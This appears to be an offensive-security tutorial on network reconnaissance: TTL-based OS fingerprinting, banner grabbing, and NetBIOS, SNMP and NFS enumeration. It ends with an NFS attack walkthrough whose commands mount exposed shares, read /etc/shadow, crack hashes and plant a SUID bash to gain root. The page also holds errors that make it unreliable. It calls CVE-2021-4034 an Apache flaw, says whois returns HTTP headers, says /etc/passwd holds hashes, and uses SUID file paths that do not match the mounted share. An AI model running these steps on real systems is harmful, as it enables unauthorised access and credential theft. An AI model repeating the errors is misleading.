🖥️ OS Fingerprinting via TTL Analysis

What is OS Fingerprinting?

OS Fingerprinting: The technique of identifying the operating system running on a remote machine by analyzing network responses, particularly TTL (Time To Live) values in ping responses and other protocol-specific behaviors.

Why OS Fingerprinting Matters:

  • Vulnerability Targeting: Different OS have different vulnerabilities
  • Exploit Selection: Choose exploits matching the OS
  • Configuration Assumptions: Predict likely security settings
  • Attack Planning: Customize attack strategy per OS
  • Network Landscape: Understand infrastructure composition

TTL Values: The Key Identifier

TTL (Time To Live): The hop count - how many network segments (routers) a packet can traverse before being discarded. Each router decrements TTL by 1. Different OSes set different initial TTL values.

Default TTL by Operating System:

Operating System Default TTL Range (After Routers) Classification
Linux / Unix / Android 64 60-64 Standard
Windows XP - Windows 11 128 110-128 NTargeted Services
Solaris / Cisco 255 240-255 Enterprise
Mac OS X 64 60-64 Unix-based
FreeBSD 64 60-64 BSD Variant
Windows Server 2003/2008 128 110-128 Server OS

How TTL Fingerprinting Works

The Process

Scenario: Attacker sends ping to 192.168.1.50

Step 1: Initial TTL

Attacker's machine has operating system, sets initial TTL value

Linux: TTL = 64 | Windows: TTL = 128

Step 2: Router Traversal

Packet passes through routers to reach destination

Each router decrements TTL: 64 → 63 → 62 (after 2 hops)

Step 3: Response TTL

Remote machine receives ping with reduced TTL

Sends echo reply with its own initial TTL value

Step 4: Analysis

Attacker receives response and checks TTL value

TTL ≈ 128? → Windows OS

TTL ≈ 64? → Linux/Unix OS

Example Output:

ping 192.168.1.50 Reply from 192.168.1.50: bytes=32 time=2ms TTL=127 → Likely Windows (one hop from 128)

Practical TTL Fingerprinting Examples

TTL = 128 (Exact)

OS Detection: Windows

Interpretation: Local network, same subnet

Likelihood: Windows 10, Server 2019, 2022

Hops: Direct connection (0 routers)

TTL = 120-127 Range

OS Detection: Windows

Interpretation: Few hops away (1-8 routers)

Example: 125 means 3 hops (128-3=125)

Finding: Through corporate network

TTL = 64 (Exact)

OS Detection: Linux/Unix/Mac

Interpretation: Local network, same subnet

Likelihood: Ubuntu, CentOS, Debian, Fedora

Hops: Direct connection (0 routers)

TTL = 60-63 Range

OS Detection: Linux/Unix/Mac

Interpretation: Few hops away (1-4 routers)

Example: 61 means 3 hops (64-3=61)

Finding: Through provider network

TTL = 255 (Exact)

OS Detection: Cisco/Solaris/Routers

Interpretation: Enterprise equipment

Finding: Network infrastructure device

Danger: May indicate high-value target

TTL = 32

OS Detection: Old Microsoft Devices

Interpretation: Legacy systems

Finding: Windows 95/98/ME

Risk: Very vulnerable systems

📡 Banner Grabbing Fundamentals

What is Banner Grabbing?

Banner Grabbing: The process of collecting information about a computer system or other network device by reading text returned when connecting to it. These "banners" reveal service names, versions, and sometimes build metadata.

Why Banner Grabbing is Critical:

  • Version Identification: Exact software version = known vulnerabilities
  • CVE Matching: Apache 2.2.8 → specific exploits available
  • Exploit Databases: Quickly match vulnerability to version
  • Automated Attacks: Metasploit uses version info for automation
  • Time Efficiency: Don't waste time on unvulnerable versions

Types of Banners

Service Port Banner Example Information Revealed
HTTP 80 Server: Apache/2.4.41 (Ubuntu) Web server, version, OS
HTTPS 443 Server: nginx/1.18 (OpenSSL 1.1) SSL/TLS info, versions
SSH 22 SSH-2.0-OpenSSH_7.4 SSH server, version
FTP 21 220 ProFTPD 1.3.5rc3 Server FTP service, version
SMTP 25 220 mail.example.com ESMTP Postfix Mail server, hostname
DNS 53 Response includes BIND version DNS server, version
MySQL 3306 5.7.31-0ubuntu0.16.04.1 Database version, OS build

Banner Grabbing Methods

Telnet Method (Legacy)

telnet target.com 80

Connect on port, read returned text

Netcat Method

nc target.com 80

Network Swiss Army knife, connect and grab

Curl Method

curl -I http://target.com

HTTP header inspection, shows Server header

Wget Method

wget --server-response -O /dev/null http://target.com

HTTP download tool, captures headers

🔎 Enumeration vs Scanning

Key Difference

Aspect Scanning Enumeration
Connection No active connection Active connections to services
Queries Probing for responses Direct queries to systems
Environment Any network (public or private) ONLY on internal networks
Information Gathered Service names, port states Usernames, shares, groups, passwords
RCE Needed No Yes (already compromised one device)
Detectability Moderate Very detectable
Example NMAP port scan Net user enumeration over network

Why Enumeration Requires RCE (Remote Code Execution)

The Problem

Scenario: Attacker on public internet tries to enumerate Windows network

  • Attacker: Public Internet (not on corporate network)
  • Target: Private Network 192.168.1.0/24
  • Firewall: Blocks all external access
  • Result: Enumeration commands won't work from outside

The Solution

Attack Progression:

  1. Step 1: Find vulnerability in web server (public)
  2. Step 2: Exploit vulnerability → gain RCE
  3. Step 3: Now running commands on internal server
  4. Step 4: FROM THERE, enumerate the network
  5. Step 5: Use enumeration data to find more targets

Example: From RCE to Enumeration

  1. Attacker exploits Apache vulnerability (CVE-2021-4034)
  2. Gets command shell on 192.168.1.50 (web server)
  3. Now attacker runs: net view
  4. Discovers other computers: 192.168.1.88 (database), 192.168.1.75 (mail)
  5. Can now target these systems from within the network

🛠️ Banner Grabbing Tools

Universal Banner Tools

Telnet - The Classic Method

Command: telnet target.com 80

How it works:

  • Connects to open port (unencrypted)
  • Displays banner immediately upon connection
  • Shows service identification text
  • Works on any open port

Output Example:

Connected to scanme.nmap.org.
Escape character is '^]'.
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu 2ubuntu2.13

Netcat - Swiss Army Knife

Command: nc target.com 80

Advantages:

  • More reliable than telnet
  • Bidirectional connection
  • Works with encrypted/unencrypted
  • Available on most systems

Example:

$ nc target.com 80
HTTP/1.1 200 OK
Server: Apache/2.4.41

Web-Specific Banner Tools

Whois Command

Command: whois http://vision-tag.com

What it extracts:

  • Public IP addresses
  • Server software (Apache, Nginx, etc.)
  • HTTP headers and metadata
  • Cookie information
  • Email addresses
  • Security headers (or lack thereof)

📥 Curl & Wget for Banner Grabbing

Curl - Command Line URL Tool

Basic Curl Banner Grabbing

Command: curl http://target.com

Common Curl Options:

-I Headers only (no body)
-i Include all headers
-v Verbose (see all details)
-A Spoof User-Agent
-H Add custom header

Practical Examples:

# Get only headers
curl -I http://example.com

# Verbose output
curl -v http://example.com

# Output:
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3

Wget - HTTP Download Tool

Banner Grabbing with Wget

Command: wget --server-response -O /dev/null http://target.com

What --server-response Does:

  • Displays HTTP headers sent by server
  • Shows response codes (200, 404, etc.)
  • Reveals server software version
  • Shows content-type information
  • -O /dev/null prevents file download

Wget vs Curl Comparison:

Wget Download files, simple headers, non-interactive
Curl More protocols, detailed headers, interactive

Output Example:

HTTP request sent, awaiting response...
HTTP/1.1 200 OK
Date: Monday 24-Mar-2026 17:56
Server: Apache/2.4.41
Content-Type: text/html
Content-Length: 15234

Captured Information from Banners

What Apache Banner Leak Means

Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3

Attacker Now Knows:

  • Web server is Apache version 2.4.41
  • Running on Ubuntu Linux
  • PHP 7.4.3 is installed and enabled
  • Can search for exploits for these versions
  • Can test for known vulnerabilities

Vulnerability Chain Example

  1. Find: Apache 2.4.41 running → curl/wget
  2. Know: CVE-2021-4034 affects Apache 2.2-2.4
  3. Search: Metasploit for matching exploit
  4. Execute: Found exploit_apache_buffer_overflow
  5. Compromise: Remote code execution achieved

🖥️ NetBIOS Enumeration

What is NetBIOS?

NetBIOS (Network Basic Input Output System): A network service that allows applications on different computers to communicate with each other. Primarily used for Windows file and printer sharing. NetBIOS name is essentially your computer name on the network.

NetBIOS vs Other Naming Systems:

System Name Type OS Example
NetBIOS Computer name (15 characters) Windows MYCOMPUTER or DESKTOP-ABC1234
Hostname DNS hostname Linux/Unix mycomputer.example.com
FQDN Fully qualified domain name Any pc1.corp.example.com

NetBIOS Ports and Protocols

Port Service Protocol Purpose Danger Level
137 NetBIOS Name Service UDP Name resolution on local network ⭐⭐⭐ High
138 NetBIOS Datagram Service UDP Messages sent without connection ⭐⭐⭐ High
139 NetBIOS Session Service TCP File/printer sharing over NetBIOS ⭐⭐⭐⭐ Critical
445 SMB (Server Message Block) TCP Modern file/printer sharing (Windows) ⭐⭐⭐⭐ Critical

⚠️ Critical Ports 139 & 445

  • Port 139: NetBIOS Session - Direct access to shares over NetBIOS
  • Port 445: SMB - Modern file sharing protocol
  • Together: Allow complete file and printer access
  • Default Share: Admin$ (C: drive accessible), IPC$ (inter-process communication)
  • If open: Attacker can copy files, upload malware, access entire system

NetBIOS Enumeration Commands

Windows: NBTStat Command

Command: nbtstat -A [IP_ADDRESS]

What it reveals:

  • NetBIOS name of the computer
  • Workgroup/Domain name
  • MAC address
  • All registered NetBIOS names
nbtstat -A 192.168.1.90

Output:
Name: DESKTOP-ABCD1234
Workgroup: WORKGROUP
MAC Address: 00-0A-95-9D-68-16

Windows: Net View

Command: net view

Lists all computers in the workgroup/domain

net view

Server Name Remark
\\DESKTOP-ABC PC1
\\LAPTOP-123 Laptop
\\SERVER-MAIL Mail Server

Linux: NBTScan

Command: nbtscan -r 192.168.1.0/24

Scans network range for NetBIOS names

nbtscan -r 192.168.1.0/24

192.168.1.50 DESKTOP-ABC1234 WORKGROUP
192.168.1.88 DBSERVER CORP
192.168.1.75 MAILSERVER CORP

RPC Client (Enumeration)

Command: rpcclient -U "" 192.168.1.50

Advanced enumeration using RPC protocol

rpcclient $> getusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]

📊 SNMP Enumeration

What is SNMP?

SNMP (Simple Network Management Protocol): A protocol for collecting and organizing information about managed devices (routers, switches, servers, printers) on IP networks. Used for monitoring and managing network performance.

Key SNMP Characteristics:

Basics

  • Port: UDP 161 (default)
  • Protocol: UDP (connectionless)
  • Purpose: Network monitoring/management
  • Uses agents on devices

Danger

  • Often left with default community strings
  • Reveals extensive system info
  • Can leak credentials
  • No authentication required (old SNMP v1)

SNMP Community Strings

Default Community Strings (VULNERABILITIES)

Public (Read-Only): "public"

Default community string for read-only access

Private (Read-Write): "private"

Default community string for read-write access

Commonly Found:

  • "public" - Public is the most common
  • "private" - Often unguarded
  • "manager" - Sometimes used
  • Company names - BP, Shell, etc.

⚠️ Danger: Many organizations never change defaults!

SNMP Enumeration Process

Step 1: Identify SNMP on Target

nmap -sU -p 161 192.168.1.0/24

Output:
192.168.1.88 161/udp open snmp

Finding: SNMP daemon is running and accessible

Step 2: Enumerate with Default Strings

nmap -sU -p 161 --script snmp-info 192.168.1.88

Output shows if SNMP is accessible

Step 3: Extract Information

snmp-check -t 192.168.1.88
snmpwalk -c public 192.168.1.88 1

Extracts extensive system information

Information Extracted via SNMP

Hardware Information

  • Processor type and count
  • Memory (RAM) size and usage
  • Disk drives and capacity
  • Network adapters
  • Device manufacturer

System Information

  • Operating system version
  • System uptime (in ticks)
  • Computer name
  • System date/time
  • Users logged in

Software Information

  • Running processes
  • Installed applications
  • Services enabled
  • Network shares
  • Open ports

Network Information

  • IP addresses and subnets
  • Routing table
  • Interface statistics
  • ARP table
  • DNS servers

📂 NFS Enumeration

What is NFS?

NFS (Network File System): A protocol allowing computers to share file systems over a network, as if the files were local. Primarily used on Linux/Unix systems for sharing directories. Critical difference from SMB (Windows) - NFS is lighter weight but can be poorly configured.

NFS vs SMB:

Aspect NFS SMB
OS Linux/Unix Windows (SMBv1-v3)
Port 111 (RPC), 2049 (NFS) 139, 445
Protocol RPC-based NetBIOS/Direct TCP
Authentication UID/GID based Username/Password
Encryption None (NFSv3), optional (NFSv4) Kerberos/NTLM

NFS Enumeration Commands

Step 1: Find NFS Port

nmap -sV -p 111 192.168.1.0/24

Output:
111/tcp open rpcbind

Step 2: List NFS Shares

showmount -e 192.168.1.88

Output (shows what's exported from target):
Export list for 192.168.1.88:
/root (everyone)
/home (everyone)
/var/backup (everyone)

Step 3: Mount and Access

# Create mount point
mkdir /mnt/nfs_target

# Mount the share
mount -t nfs 192.168.1.88:/root /mnt/nfs_target

# Browse the remote files
ls -la /mnt/nfs_target

NFS Vulnerability: No Authentication

The Core Problem

Traditional NFS (v3): No authentication mechanism! Access is based on IP addresses and UIDs

How Exploitation Works:

  1. Step 1: Find NFS shares using showmount
  2. Step 2: Permissions say "root" (UID 0) can read all
  3. Step 3: Attacker sets their UID to 0
  4. Step 4: Mount the share, full access automatically granted
  5. Step 5: Browse/modify/copy critical files
  6. Step 6: Can even create SUID binaries

Practical Attack: Copy /etc/passwd

# After mounting /root share
cp /mnt/nfs_target/etc/passwd .

# Now attacker has password hashes!
# Can crack with John or Hashcat
john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt

⚔️ NFS Exploitation: Full Access

Complete NFS Exploitation Attack

Stage 1: Discovery

Find NFS service running on target network

Stage 2: Enumeration

List exported shares and permissions

Stage 3: Access

Mount shares locally with no authentication

Stage 4: Exploitation

Access sensitive files and data

Stage 5: Privilege Escalation

Create SUID binaries for local root

Detailed Attack Walkthrough

Step 1-3: Discovery & Mounting

# Reconnaissance
┌─[attacker]─[/tmp]
└──╼ $ nmap -sV -p 111 192.168.1.88
111/tcp open rpcbind

# Enumerate NFS
┌─[attacker]─[/tmp]
└──╼ $ showmount -e 192.168.1.88
Export list for 192.168.1.88:
/root (everyone)
/home (everyone)

# Create mount point
mkdir /mnt/nfs_root
mkdir /mnt/nfs_home

# Mount the shares
mount -t nfs 192.168.1.88:/root /mnt/nfs_root
mount -t nfs 192.168.1.88:/home /mnt/nfs_home

Step 4: Browse and Extract Files

# List contents of remote root
ls -la /mnt/nfs_root/

drwxr-xr-x root root 4096 etc
drwxr-xr-x root root 4096 home
drwxr-xr-x root root 4096 hackers
drwxr-xr-x root root 4096 var

# Access sensitive files
cat /mnt/nfs_root/etc/passwd
cat /mnt/nfs_root/etc/shadow (if readable!)

# Copy important files
cp -r /mnt/nfs_root/etc ~/compromised_etc
cp -r /mnt/nfs_root/home ~/compromised_home

Result: Complete read access to remote filesystem!

Step 5: Privilege Escalation via SUID

# Create SUID binary to escalate privileges
# Copy /bin/bash to NFS mount
cp /bin/bash /mnt/nfs_root/bin/bash_suid

# Set SUID bit (this runs as root when executed)
chmod 4777 /mnt/nfs_root/bin/bash_suid

# From victim machine (or RCE shell):
# Execute the SUID bash
/bin/bash_suid -p

# Now running as ROOT!
id
uid=0(root) gid=0(root) groups=0(root)

Result: Complete system compromise!

Why NFS is So Dangerous

The Perfect Attack Vector

  • No credentials required: IP-based authentication only
  • No encryption: Data sent in clear text
  • Full file system access: Can browse everything
  • Write access: Can modify files if permissions allow
  • Privilege escalation: SUID binaries lead to root
  • Often misconfigured: Exported to "everyone"
  • Forgotten by admins: Set up once, never reviewed

💥 Remote Code Execution (RCE)

What is RCE?

Remote Code Execution (RCE): The ability to execute arbitrary commands or code on a target system from a remote location. The "holy grail" of hacking - once you have RCE, you essentially own the system.

Path to RCE in Attack Chain:

Stage 1: Scanning

Find open ports and services

Stage 2: Banner Grabbing

Identify software versions

Stage 3: Find Vulnerability

Search CVE database for version exploits

Stage 4: Exploit

Execute code on target

Stage 5: RCE Achieved

Have command execution on target

Types of RCE

RCE via Vulnerable Service

Example: Apache 2.2.8 buffer overflow

Process:

  • Banner grab reveals Apache 2.2.8
  • Search: "Apache 2.2.8 exploit"
  • Find Metasploit module
  • Execute exploit module
  • Get shell on web server

RCE via Upload

Example: Unrestricted file upload on web app

Process:

  • Find upload functionality
  • Bypass filters (change extension)
  • Upload web shell (PHP/ASP)
  • Access shell via web browser
  • Execute commands through web shell

RCE via Injection

Example: SQL injection leading to command execution

Process:

  • Find SQL injection vulnerability
  • Use stacked queries
  • Execute system commands
  • Get reverse shell

RCE via Privilege Escalation

Example: Local privilege escalation after initial access

Process:

  • Have low-privilege shell
  • Find local privilege escalation
  • Exploit to gain root/admin
  • Now have admin RCE
